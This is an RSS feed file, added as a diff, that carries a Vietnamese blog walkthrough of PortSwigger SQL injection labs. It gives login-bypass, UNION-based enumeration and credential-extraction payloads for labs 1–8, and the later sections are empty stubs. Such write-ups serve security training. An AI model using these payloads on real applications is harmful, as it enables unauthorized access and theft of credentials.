@@ -1,0 +1,218 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Portswigger - Tag - g03m0n</title>
+        <link>https://g03m0n.github.io/tags/portswigger/</link>
+        <description>Portswigger - Tag - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/portswigger/" rel="self" type="application/rss+xml" /><item>
+    <title>PortSwigger - SQL Injection</title>
+    <link>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</guid>
+    <description><![CDATA[<h2 id="1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description">Description</h3>
+<p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
+<h3 id="step">Step</h3>
+<p>Đầu tiên click vào một category bất kỳ
+Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
+<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
+</code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
+Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
+Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
+<p></p>
+<p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
+<p><code>?category=Accessories'</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
+<p></p>
+<p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
+<p><code>?category=Accessories' --</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
+Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
+<p></p>
+<p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
+<p><code>?category=Acesssories' or '1'='1' --'</code></p>
+<p>Chuỗi truy vấn lúc này sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-1">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong chức năng đăng nhập.</p>
+<p>Để giải quyết bài lab, thực hiện một cuộc tấn công SQLi để đăng nhập vào ứng dụng với tư cách là <code>administrator</code>.</p>
+<h3 id="step-1">Step</h3>
+<p>Đầu tiên ấn vào <code>My account</code> để vào giao diện <code>login</code>
+Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
+<p></p>
+<p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
+</span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
+<p></p>
+<p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
+Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
+Câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
+<p></p>
+<p>Đăng nhập thành công.
+Solved</p>
+<p></p>
+<h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-2">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-2">Step</h3>
+<p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
+Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-3">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-3">Step</h3>
+<p>Lab này tương tự như lab về <a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle" rel="">Oracle Datable</a>
+ nhưng sử dụng MySQL Database.
+Đầu tiên ta cũng dự đoán số cột tương tự <a href="#step-2" rel="">lab 3</a>
+ .
+Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION SELECT NULL,NULL --'</code></p>
+<p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,@@version --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-4">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
+<h3 id="step-4">Step</h3>
+<p>Đầu tiên, ta sẽ dò số cột trong database:</p>
+<p></p>
+<p>Như vậy ta đã biết trong database có 2 cột.
+Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
+<p>
+</p>
+<p>Ta sử dụng payload này để kiểm tra tên bảng có trong database: <code>' UNION SELECT NULL, table_name FROM information_schema.tables --'</code></p>
+<p></p>
+<p>Có 2 bảng là <code>pg_user</code> và <code>users_excods</code>
+Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra trong bảng <code>user_excods</code> có 2 cột khả nghi.</p>
+<p>Payload: <code>' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_excods' --'</code></p>
+<p></p>
+<p>Kiểm tra 2 cột, ta biết được tài khoản/mật khẩu của <code>administrator</code>.</p>
+<p>Payload: <code>' UNION SELECT username_tjzvcx, password_ligkez FROM users_excods --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-5">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
+<h3 id="step-5">Step</h3>
+<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
+ ở trên nên mình sẽ làm tương tự.</p>
+<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
+<p></p>
+<p></p>
+<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
+Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
+<p></p>
+<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
+<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
+</p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-6">Description</h3>
+<p>Bài lab yêu cầu ta xác định số cột của bảng bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-6">Step</h3>
+<p>Tương tự cách xác định cột tại <a href="#step-3" rel="">đây</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-7">Description</h3>
+<p>Bài lab yêu cầu ta tìm chuỗi dữ liệu cho trước <code>64fl9W</code> bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-7">Step</h3>
+<p>Đầu tiên ta cũng <a href="#step-3" rel="">xác định số cột của bảng</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Với UNION Attack, ta có thể tìm một cột chưa giá trị loại <code>string</code> bằng cách thử chèn đoạn <code>string</code> cần tìm vào:</p>
+<p>Payload: <code>' UNION SELECT NULL, '64fl9W' ,NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-8">Description</h3>
+<h3 id="step-8">Step</h3>
+<h2 id="10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-9">Description</h3>
+<h3 id="step-9">Step</h3>
+<h2 id="11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-10">Description</h3>
+<h3 id="step-10">Step</h3>
+<h2 id="12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-11">Description</h3>
+<h3 id="step-11">Step</h3>
+<h2 id="13">13.</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-12">Description</h3>
+<h3 id="step-12">Step</h3>
+]]></description>
+</item>
+</channel>
+</rss>
